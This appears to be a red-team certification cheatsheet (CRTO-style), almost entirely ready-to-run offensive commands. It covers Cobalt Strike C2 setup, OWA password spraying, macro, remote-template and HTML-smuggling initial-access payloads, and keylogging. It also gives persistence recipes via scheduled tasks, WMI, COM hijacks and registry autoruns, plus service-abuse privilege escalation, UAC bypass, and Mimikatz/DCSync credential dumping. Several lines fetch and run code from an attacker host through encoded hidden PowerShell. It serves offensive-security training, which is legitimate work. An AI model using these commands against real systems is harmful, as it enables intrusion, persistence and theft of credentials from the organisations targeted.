# CRTO Cheatsheet

> 10.10.5.50 = Attacker IP

## C2 - Cobalt Strike

### Run Server

```bash
# Run
/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

### Run as a Service

```bash
sudo vim /etc/systemd/system/teamserver.service

## Paste this
[Unit]
Description=Cobalt Strike Team Server
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=always
RestartSec=1
User=root
WorkingDirectory=/home/attacker/cobaltstrike
ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile

[Install]
WantedBy=multi-user.target

sudo systemctl daemon-reload
sudo systemctl start teamserver.service
sudo systemctl enable teamserver.service
```

### Listeners

#### HTTP

Config:

- Beacon HTTP
- HTTP Hosts o HTTP Hosts Stager: `attacker IP`
- Start 80 PORT: `sudo ss -lntp`

#### DNS

Config DNS

|Name |Type | Data |
|----------|----------|----------|
|@ 	|A 	|10.10.5.50|
|ns1 |A  |10.10.5.50|
|pics| NS |ns1.nickelviper.com.|

- DNS Hosts and DNS Hosts (Stager): `Attacker IP`

#### SMB

> `ls \\.\pipe\` to emulate a common name

- Pipename (C2): Input name

#### TCP

- Port (C2): Port 
- Bind to localhost only: optional


#### Pivot Listener

> A pivot listener can only be created on an existing Beacon, and not via the normal Listeners menu

1. Right-click on a Beacon and select Pivoting > Listener.  This will open a "New Listener" window
2. On beacon: `run netstat -anop tcp`
3. We can now generate payloads for this listener

## Initial Compromise

### Outlook

```powershell
Import-Module C:\Tools\MailSniper\MailSniper.ps1
#Enumerate the NetBIOS name 
Invoke-DomainHarvestOWA -ExchHostname mail.test.local
# Get a list of users
./namemash.py names.txt > possible.txt
# timing attack to validate which (if any) of these usernames are valid
Invoke-UsernameHarvestOWA -ExchHostname mail.test.local -Domain <NETBIOS NAME> -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
# Password Spraying
Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
# Get Address List
Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
```

### Initial Access Payloads

> One significant difference (apart from how you dress it up to the user), is that any file downloaded via a browser (outside of a trusted zone) will be tainted with the "Mark of the Web" (MOTW).

```powershell
## Get Zone data of file
Get-Content .\test.txt -Stream Zone.Identifier
```
The possible zones are:

- 0 => Local computer
- 1 => Local intranet
- 2 => Trusted sites
- 3 => Internet
- 4 => Restricted sites

#### VBA Shell

> Cobalt Strike > Attacks > Scripted Web Delivery > Select Payload 

```vb
Sub AutoOpen()

  Dim Shell As Object
  Set Shell = CreateObject("wscript.shell")
  Shell.Run "powershell payload here"

End Sub
```

*You save the doc `as .doc` ~~not .docx or .docm~~*

##### Remote Template Injection

Remote Template Injection is a technique where an attacker sends a benign document to a victim, which downloads and loads a malicious template.

1. Save the document as a dot file
2. 7Zip > Open archive.  Navigate to word > _rels, right-click on settings.xml.rels and select Edit.
3. Change `Target=` to `Target="http://nickelviper.com/template.dot"`

or use this tool

```bash
python3 remoteinjector.py -w http://nickelviper.com/template.dot /mnt/c/Payloads/document.docx
```

#### HTML Smuggling

```bash
cat file | base64
# And modify the file variable and the fileName
```

```html
<html>
    <head>
        <title>HTML Smuggling</title>
    </head>
    <body>
        <p>This is all the user will see...</p>

        <script>
        function convertFromBase64(base64) {
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            var bytes = new Uint8Array( len );
            for (var i = 0; i < len; i++) { bytes[i] = binary_string.charCodeAt(i); }
            return bytes.buffer;
        }

        var file ='VGhpcyBpcyBhIHNtdWdnbGVkIGZpbGU=';
        var data = convertFromBase64(file);
        var blob = new Blob([data], {type: 'octet/stream'});
        var fileName = 'test.txt';

        if(window.navigator.msSaveOrOpenBlob) window.navigator.msSaveBlob(blob,fileName);
        else {
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none';
            var url = window.URL.createObjectURL(blob);
            a.href = url;
            a.download = fileName;
            a.click();
            window.URL.revokeObjectURL(url);
        }
        </script>
    </body>
</html>
```

#### Host Reconnaissance

```bash
# List processes
ps

# Collect Data
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system

# Screenshots
printscreen               ##Take a single screenshot via PrintScr method
screenshot                ##Take a single screenshot
screenwatch               ##Take periodic screenshots of desktop

# Keylogger
keylogger               ## RUn keylogger
jobs                    ## List jobs
jobkill <id>               ## Kill job (keylogger)

# Clipboard
clipboard               ## Get Clipboard

# list the logon sessions on this machine
net logons
```

##### Web Categorization

- https://sitereview.bluecoat.com/
- https://github.com/mdsecactivebreach/Chameleon

## Persistence

> Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons.  Use P2P or DNS Beacons instead.

### SharPersist

- https://github.com/mandiant/SharPersist


* -t is the desired persistence technique.
* -c is the command to execute.
* -a are any arguments for that command.
* -n is the name of the task.
* -m is to add the task (you can also remove, check and list).
* -o is the task frequency.

#### Windows Services

This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.

```bash
beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
```

#### WMI Events

- https://github.com/Sw4mpf0x/PowerLurk

Persistence via WMI events can be achieved by leveraging the following three classes:

* EventConsumer
* EventFilter
* FilterToConsumerBinding


```bash
beacon> powershell-import C:\Tools\PowerLurk.ps1
beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
# Remove backdoor
Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
```

#### Task Scheduler

```powershell
# If you generate a powershell payload (Windows)
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
```

```bash
# If you generate a powershell payload (Linux)
set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
echo -en $str | iconv -t UTF-16LE | base64 -w 0
```

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
```

#### Startup Folder

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
```

#### Registry AutoRun

```bash
# Upload a file.exe to C:|ProgramData\ or another directory and rename to Updater.exe 
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

#### Hunting for COM Hijacks

1. Open Process Monitor
2. Filter Operation is RegOpenKey
3. Result is NAME NOT FOUND
4. Path ends with InprocServer32
5. Find one that's loaded semi-frequently but not so much so or loaded when a commonly used application

Example:

HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32 is loaded by C:\Windows\System32\DllHost.exe

```powershell
Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

> To clean-up a COM hijack, simply remove the registry entries from HKCU and delete the DLL.

```powershell
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}
```

we can verify that it's currently implemented in HKLM and not HKCU.

```powershell
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
```

## Host Privilege Escalation

### Windows Services

```powershell
#List Services
sc query
Get-Service | fl
```

### Unquoted Service Paths

> When you start the service, you'll see its state will be START_PENDING.  If you then check its status with sc query VulnService1, you'll see it will be STOPPED.  This is by design

```powershell
# Check with SharpU
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
# Manual check
run wmic service get name, pathname
# Get if you have write permission
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
```

### Weak Service Permissions

```powershell
execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
powershell-import C:\Tools\Get-ServiceAcl.ps1
powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
# Change path
run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
# Validate changed path
run sc qc VulnService2
run sc stop VulnService2
run sc start VulnService2
```

### Weak Service Binary Permissions

BUILTIN\Users have Modify privileges over Service 

> This allows us to overwrite the binary with something else (make sure you take a backup first).

```powershell
powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
download Service 3.exe
copy "tcp-local_x64.svc.exe" "Service 3.exe"
upload C:\Payloads\Service 3.exe
run sc stop VulnService3
upload C:\Payloads\Service 3.exe
run sc start VulnService3
```

### UAC Bypass

- https://github.com/cobalt-strike/ElevateKit

```powershell
whoami /groups
# Medium or High. Medium no Admin and you need bypass UAC, High Admin
beacon> elevate uac-schtasks tcp-local
```

## Credential Theft

### Mimikatz

- The `!` elevates Beacon to SYSTEM before running the given command
- The `@` impersonates Beacon's thread token before running the given command

```bash
beacon> mimikatz token::elevate ; lsadump::sam
beacon> mimikatz !lsadump::sam

#Logon Passwords (lsass)
beacon> mimikatz !sekurlsa::logonpasswords

# Kerberos Encryption Keys
beacon> mimikatz !sekurlsa::ekeys

# SAM
beacon> mimikatz !lsadump::sam

# Domain Cached Credentials
# DCC is orders of magnitude slower to crack than NTLM.
# $DCC2$<iterations>#<username>#<hash>
beacon> mimikatz !lsadump::cache
```

### Extracting Kerberos Tickets

```bash
# List tickets
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
# Extract specif user ticket
# This will output the ticket(s) in base64 encoded format
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
```

### DCSync

```bash
beacon> make_token DEV\nlamb F3rrari
beacon> dcsync dev.cyberbotic.io DEV\krbtgt
beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
```

## Wordlists

